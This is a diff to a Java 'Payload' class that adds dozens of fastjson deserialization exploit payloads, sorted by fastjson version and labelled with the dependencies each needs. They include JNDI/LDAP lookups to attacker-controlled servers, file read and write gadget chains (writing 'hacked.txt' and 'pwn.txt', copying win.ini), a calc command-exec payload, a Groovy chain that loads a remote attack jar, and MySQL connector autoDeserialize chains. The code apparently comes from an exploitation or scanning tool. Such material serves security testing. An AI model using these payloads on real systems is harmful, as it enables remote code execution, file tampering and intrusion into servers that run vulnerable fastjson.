@@ -269,6 +269,203 @@ public class Payload {
         vulnerabilities.add(new Vulnerability("Check < 1262 xbean -1", "目标服务端需要存在xbean-reflect包", "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"rmi://127.0.0.1:1098/exploit\"}"));
         vulnerabilities.add(new Vulnerability("Check < 1262 xbean -2", "目标服务端需要存在xbean-reflect包", "{\"@type\":\"org.apache.cocoon.components.slide.impl.JMSContentInterceptor\", \"parameters\": {\"@type\":\"java.util.Hashtable\",\"java.naming.factory.initial\":\"com.sun.jndi.rmi.registry.RegistryContextFactory\",\"topic-factory\":\"ldap://localhost:1389/Exploit\"}, \"namespace\":\"\"}"));
         //fastjson<=1.2.66
+        vulnerabilities.add(new Vulnerability("Check <= 1266 shiro -1", "目标服务端需要存在shiro-core包", "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://192.168.80.1:1389/Calc\"}"));
+        vulnerabilities.add(new Vulnerability("Check <= 1266 shiro -2", "目标服务端需要存在shiro-core包", "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://localhost:1389/Exploit\"]"));
+        vulnerabilities.add(new Vulnerability("Check <= 1266 dbcp -1", "目标服务端需要存在Anteros-Core和Anteros-DBCP包", "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://192.168.80.1:1389/Calc\"}"));
+        vulnerabilities.add(new Vulnerability("Check <= 1266 dbcp -2", "目标服务端需要存在Anteros-Core和Anteros-DBCP包", "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://localhost:1389/Exploit\"}"));
+        vulnerabilities.add(new Vulnerability("Check <= 1266 jta", "目标服务端需要存在ibatis-sqlmap和jta包", "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"ldap://192.168.80.1:1389/Calc\"}"));
+        vulnerabilities.add(new Vulnerability("Check <= 1266 ibatis", "目标服务端需要存在ibatis-sqlmap和jta包", "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://192.168.80.1:1399/Calc\"}}"));
+        vulnerabilities.add(new Vulnerability("Check <= 1266 output file", "写文件", "{\n" +
+                "    \"@type\": \"java.lang.AutoCloseable\",\n" +
+                "    \"@type\": \"sun.rmi.server.MarshalOutputStream\",\n" +
+                "    \"out\": {\n" +
+                "        \"@type\": \"java.util.zip.InflaterOutputStream\",\n" +
+                "        \"out\": {\n" +
+                "           \"@type\": \"java.io.FileOutputStream\",\n" +
+                "           \"file\": \"/tmp/asdasd\",\n" +
+                "           \"append\": true\n" +
+                "        },\n" +
+                "        \"infl\": {\n" +
+                "           \"input\": {\n" +
+                "               \"array\": \"eJxLLE5JTCkGAAh5AnE=\",\n" +
+                "               \"limit\": 14\n" +
+                "           }\n" +
+                "        },\n" +
+                "        \"bufLen\": \"100\"\n" +
+                "    },\n" +
+                "    \"protocolVersion\": 1\n" +
+                "}"));
+        //fastjson<=1.2.67
+        vulnerabilities.add(new Vulnerability("Check <= 1267 jta", "目标服务端需要存在ignite-core、ignite-jta和jta包", "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\", \"jndiNames\":[\"ldap://localhost:1389/Exploit\"], \"tm\": {\"$ref\":\"$.tm\"}}"));
+        vulnerabilities.add(new Vulnerability("Check <= 1267 shiro", "目标服务端需要存在shiro-core和slf4j-api包", "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://localhost:1389/Exploit\",\"instance\":{\"$ref\":\"$.instance\"}}"));
+        //fastjson<=1.2.68
+        vulnerabilities.add(new Vulnerability("Check <= 1268 hadoop -1", "利用类必须是expectClass类的子类或实现类，并且有相关依赖", "{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:1389/Exploit\"}"));
+        vulnerabilities.add(new Vulnerability("Check <= 1268 hadoop -2", "利用类必须是expectClass类的子类或实现类，并且有相关依赖", "{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://localhost:1389/Exploit\"}"));
+        vulnerabilities.add(new Vulnerability("Check <= 1268 caucho -2", "利用类必须是expectClass类的子类或实现类，并且有相关依赖", "{\"@type\":\"com.caucho.config.types.ResourceRef\",\"lookupName\": \"ldap://localhost:1389/Exploit\", \"value\": {\"$ref\":\"$.value\"}}"));
+        vulnerabilities.add(new Vulnerability("Check <= 1268 exec", "利用类必须是expectClass类的子类或实现类，并且有相关依赖", "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"vul.VulAutoCloseable\",\"cmd\":\"calc\"}"));
+        vulnerabilities.add(new Vulnerability("Check <= 1268 read file", "利用类必须是expectClass类的子类或实现类，并且有相关依赖", "{\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\", \"tempPath\":\"C:/Windows/win.ini\", \"targetPath\":\"D:/wamp64/www/win.txt\"}"));
+        vulnerabilities.add(new Vulnerability("Check <= 1268 out file -1", "利用类必须是expectClass类的子类或实现类，并且有相关依赖", "{\n" +
+                "    \"stream\": {\n" +
+                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
+                "        \"@type\": \"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\n" +
+                "        \"targetPath\": \"D:/wamp64/www/hacked.txt\",\n" +
+                "        \"tempPath\": \"D:/wamp64/www/test.txt\"\n" +
+                "    },\n" +
+                "    \"writer\": {\n" +
+                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
+                "        \"@type\": \"com.esotericsoftware.kryo.io.Output\",\n" +
+                "        \"buffer\": \"cHduZWQ=\",\n" +
+                "        \"outputStream\": {\n" +
+                "            \"$ref\": \"$.stream\"\n" +
+                "        },\n" +
+                "        \"position\": 5\n" +
+                "    },\n" +
+                "    \"close\": {\n" +
+                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
+                "        \"@type\": \"com.sleepycat.bind.serial.SerialOutput\",\n" +
+                "        \"out\": {\n" +
+                "            \"$ref\": \"$.writer\"\n" +
+                "        }\n" +
+                "    }\n" +
+                "}"));
+        vulnerabilities.add(new Vulnerability("Check <= 1268 out file -2", "利用类必须是expectClass类的子类或实现类，并且有相关依赖", "{\n" +
+                "    'stream':\n" +
+                "    {\n" +
+                "        '@type':\"java.lang.AutoCloseable\",\n" +
+                "        '@type':'java.io.FileOutputStream',\n" +
+                "        'file':'/tmp/nonexist',\n" +
+                "        'append':false\n" +
+                "    },\n" +
+                "    'writer':\n" +
+                "    {\n" +
+                "        '@type':\"java.lang.AutoCloseable\",\n" +
+                "        '@type':'org.apache.solr.common.util.FastOutputStream',\n" +
+                "        'tempBuffer':'SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=',\n" +
+                "        'sink':\n" +
+                "        {\n" +
+                "            '$ref':'$.stream'\n" +
+                "        },\n" +
+                "        'start':38\n" +
+                "    },\n" +
+                "    'close':\n" +
+                "    {\n" +
+                "        '@type':\"java.lang.AutoCloseable\",\n" +
+                "        '@type':'org.iq80.snappy.SnappyOutputStream',\n" +
+                "        'out':\n" +
+                "        {\n" +
+                "            '$ref':'$.writer'\n" +
+                "        }\n" +
+                "    }\n" +
+                "}"));
+        vulnerabilities.add(new Vulnerability("Check <= 1268 out file -3", "利用类必须是expectClass类的子类或实现类，并且有相关依赖", "{\n" +
+                "  \"@type\": \"java.lang.AutoCloseable\",\n" +
+                "  \"@type\": \"sun.rmi.server.MarshalOutputStream\",\n" +
+                "  \"out\": {\n" +
+                "    \"@type\": \"java.util.zip.InflaterOutputStream\",\n" +
+                "    \"out\": {\n" +
+                "      \"@type\": \"java.io.FileOutputStream\",\n" +
+                "      \"file\": \"dst\",\n" +
+                "      \"append\": \"false\"\n" +
+                "    },\n" +
+                "    \"infl\": {\n" +
+                "      \"input\": \"eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==\"\n" +
+                "    },\n" +
+                "    \"bufLen\": 1048576\n" +
+                "  },\n" +
+                "  \"protocolVersion\": 1\n" +
+                "}"));
+        vulnerabilities.add(new Vulnerability("Check <= 1268 out file -3", "利用类必须是expectClass类的子类或实现类，并且有相关依赖，position写入的长度，必须和base64编码前的长度一致", "{\n" +
+                "    \"stream\": {\n" +
+                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
+                "        \"@type\": \"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\n" +
+                "        \"targetPath\": \"f:/pwn.txt\",\n" +
+                "        \"tempPath\": \"\"\n" +
+                "    },\n" +
+                "    \"writer\": {\n" +
+                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
+                "        \"@type\": \"com.esotericsoftware.kryo.io.Output\",\n" +
+                "        \"buffer\": \"YjF1M3I=\",\n" +
+                "        \"outputStream\": {\n" +
+                "            \"$ref\": \"$.stream\"\n" +
+                "        },\n" +
+                "        \"position\": 5\n" +
+                "    },\n" +
+                "    \"close\": {\n" +
+                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
+                "        \"@type\": \"com.sleepycat.bind.serial.SerialOutput\",\n" +
+                "        \"out\": {\n" +
+                "            \"$ref\": \"$.writer\"\n" +
+                "        }\n" +
+                "    }\n" +
+                "}"));
+        vulnerabilities.add(new Vulnerability("Check <= 1268 out file -4", "利用类必须是expectClass类的子类或实现类，并且有相关依赖", "{\n" +
+                " \"x\":{\n" +
+                " \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
+                " \"input\":{\n" +
+                " \"@type\":\"java.lang.AutoCloseable\",\n" +
+                " \"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\n" +
+                " \"reader\":{\n" +
+                " \"@type\":\"jdk.nashorn.api.scripting.URLReader\",\n" +
+                " \"url\":\"http://127.0.0.1:8083/test.txt\"\n" +
+                " },\n" +
+                " \"charsetName\":\"UTF-8\",\n" +
+                " \"bufferSize\":10000\n" +
+                " },\n" +
+                " \"branch\":{\n" +
+                " \"@type\":\"java.lang.AutoCloseable\",\n" +
+                " \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\n" +
+                " \"writer\":{\n" +
+                " \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\n" +
+                " \"file\":\"/tmp/files/12345\",\n" +
+                " \"encoding\":\"UTF-8\",\n" +
+                " \"append\": true\n" +
+                " },\n" +
+                " \"charset\":\"UTF-8\",\n" +
+                " \"bufferSize\": 8193,\n" +
+                " \"writeImmediately\": true\n" +
+                " },\n" +
+                " \"trigger\":{\n" +
+                " \"@type\":\"java.lang.AutoCloseable\",\n" +
+                " \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
+                " \"is\":{\n" +
+                " \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
+                " \"input\":{\n" +
+                " \"$ref\":\"$.input\"\n" +
+                " },\n" +
+                " \"branch\":{\n" +
+                " \"$ref\":\"$.branch\"\n" +
+                " },\n" +
+                " \"closeBranch\": true\n" +
+                " },\n" +
+                " \"httpContentType\":\"text/xml\",\n" +
+                " \"lenient\":false,\n" +
+                " \"defaultEncoding\":\"UTF-8\"\n" +
+                " }\n" +
+                " }\n" +
+                "}"));
+        vulnerabilities.add(new Vulnerability("Check <= 1268 Mysqlconnector -1", "Mysqlconnector 5.1.x，利用类必须是expectClass类的子类或实现类，并且有相关依赖，https://b1ue.cn/archives/506.html", "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.jdbc.JDBC4Connection\",\"hostToConnectTo\":\"mysql.host\",\"portToConnectTo\":3306,\"info\":{\"user\":”user\",\"password\":\"pass\",\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\",\"NUM_HOSTS\": \"1\"},\"databaseToConnectTo\":\"dbname\",\"url\":\"\"}"));
+        vulnerabilities.add(new Vulnerability("Check <= 1268 Mysqlconnector -2", "Mysqlconnector 6.0.2 or 6.0.3，利用类必须是expectClass类的子类或实现类，并且有相关依赖，https://b1ue.cn/archives/506.html", "{\"@type\": \"java.lang.AutoCloseable\",\"@type\": \"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\",\"proxy\":{\"connectionString\":{\"url\": \"jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true\"}}}"));
+        vulnerabilities.add(new Vulnerability("Check <= 1268 Mysqlconnector -3", "Mysqlconnector 6.x or < 8.0.20，利用类必须是expectClass类的子类或实现类，并且有相关依赖，https://b1ue.cn/archives/506.html", "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\",\"proxy\":{\"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\",\"connectionUrl\":{\"@type\":\"com.mysql.cj.conf.url.ReplicationConnectionUrl\", \"masters\": [{\"host\":\"mysql.host\"}], \"slaves\":[], \"properties\":{\"host\":\"mysql.host\",\"user\":\"user\",\"dbname\":\"dbname\",\"password\":\"pass\",\"queryInterceptors\":\"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\"}}}}\n"));
+
+        vulnerabilities.add(new Vulnerability("Check <= 1268 transaction -1", "有相关依赖", "{\"@type\":\"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory\", \"tmJndiName\": \"ldap://localhost:1389/Exploit\", \"tmFromJndi\": true, \"transactionManager\": {\"$ref\":\"$.transactionManager\"}}"));
+        vulnerabilities.add(new Vulnerability("Check <= 1268 transaction -2", "有相关依赖", "{\"@type\":\"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory\", \"tmJndiName\": \"ldap://localhost:1389/Exploit\", \"tmFromJndi\": true, \"transactionManager\": {\"$ref\":\"$.transactionManager\"}}"));
+        vulnerabilities.add(new Vulnerability("Check <= 1268 transaction -2", "有相关依赖", "{\"@type\":\"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory\", \"tmJndiName\": \"ldap://localhost:1389/Exploit\", \"tmFromJndi\": true, \"transactionManager\": {\"$ref\":\"$.transactionManager\"}}"));
+        vulnerabilities.add(new Vulnerability("Check 1276-1283 step1", "有相关依赖", "{\n" +
+                "  \"@type\":\"java.lang.Exception\",\n" +
+                "  \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
+                "  \"unit\":{\n" +
+                "  }\n" +
+                "}"));
+        vulnerabilities.add(new Vulnerability("Check 1276-1283 step2", "有相关依赖", "{\n" +
+                "  \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
+                "  \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
+                "  \"config\":{\n" +
+                "    \"@type\": \"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
+                "    \"classpathList\":[\"http://127.0.0.1:8433/attack-1.jar\"]\n" +
+                "  },\n" +
+                "  \"gcl\":null,\n" +
+                "  \"destDir\": \"/tmp\"\n" +
+                "}"));
         // 添加更多漏洞...
 
         return vulnerabilities;
